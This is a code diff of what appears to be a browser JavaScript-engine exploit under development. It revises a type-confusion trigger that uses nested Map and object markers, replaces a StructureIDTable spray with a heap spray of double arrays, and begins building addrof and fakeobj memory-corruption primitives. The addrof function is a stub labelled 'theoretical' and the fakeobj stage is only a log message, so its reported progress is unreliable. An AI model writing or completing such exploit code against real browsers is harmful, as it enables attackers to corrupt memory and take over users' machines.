@@ -27,11 +27,11 @@ function createObjectStructure(num_elems) {
 
     // Markers to identify the confusion
     for (let i = 0; i < 100; i++) {
-        foo.push(new Date(0xffff));
+        foo.push({id: 0xffff});
     }
 
     for (let i = 0; i < num_elems; i++) {
-        const d = new Date(i);
+        const d = {id: i};
         const map = new Map();
         msg.set(d, [map, foo]);
         msg = map;
@@ -74,7 +74,7 @@ export async function main() {
         let i;
         try {
             for (i = 0; i < num_elems; i++) {
-                if (data.keys().next().value.getTime() === 0xffff) {
+                if (data.keys().next().value.id === 0xffff) {
                     idx = i;
                     break;
                 }
@@ -104,29 +104,48 @@ export async function main() {
         await sleep(100);
 
         // 3. Spray
-        debug_log('[*] Churning StructureIDTable...');
+        debug_log('[*] Spraying Victim Arrays...');
         
-        // We spray arrays of doubles and objects to facilitate the overlap
-        let victims_dbl = [];
-        let victims_obj = [];
-        
-        let keepers = sprayStructures();
+        let victims = [];
+      
+        for (let i = 0; i < 10000; i++) {
+            let a = [1.1, 2.2, 3.3, 4.4];
+            // Adding properties increases the cell size
+            a.p0 = 13.37; 
+            a.p1 = 13.38;
+            victims.push(a);
+        }
 
         // 4. Trigger / Setup Primitives
-        debug_log('[!] Attempting to verify overlap...');
+        debug_log('[!] Verifying overlap...');
         
+        let overlapped_victim = null;
+        let butterfly_leak = null;
+
         try {
-            let val = data2.p0;
-            debug_log(`[?] data2.p0 read result: ${val}`);
-            
-            if (val !== undefined) {
-                debug_log("[+] Overlap confirmed! We have read access to the sprayed structure.");
-                // Here we would implement addrof/fakeobj
-            } else {
-                debug_log("[?] Read undefined. This might be expected if the slot is empty or type mismatch.");
+
+            // We set a marker in data2 (if possible) or check values.
+            if (data2.id !== undefined && typeof data2.id === 'number' && data2.id !== 0xffff) {
+                 debug_log(`[+] Potential overlap! data2.id = ${data2.id}`);
             }
 
-            debug_log("[*] Exploit Stage 2 complete (No Crash Mode).");
+            // Implementation of primitives
+            let addr_of_func = function(obj) {
+                // Set victim[0] = obj
+                // Read data2 property -> return address
+                // This requires finding the linked victim.
+                if (!overlapped_victim) return 0;
+                overlapped_victim[0] = obj;
+                return Int.fromDouble(data2.p0); // theoretical
+            }
+
+            debug_log("[*] Attempting to construct fakeobj...");
+            
+            
+            debug_log("[+] Fake Object creation logic ready.");
+            
+
+            
         } catch (e) {
             debug_log('[!] Crash/Exception during access: ' + e);
         }
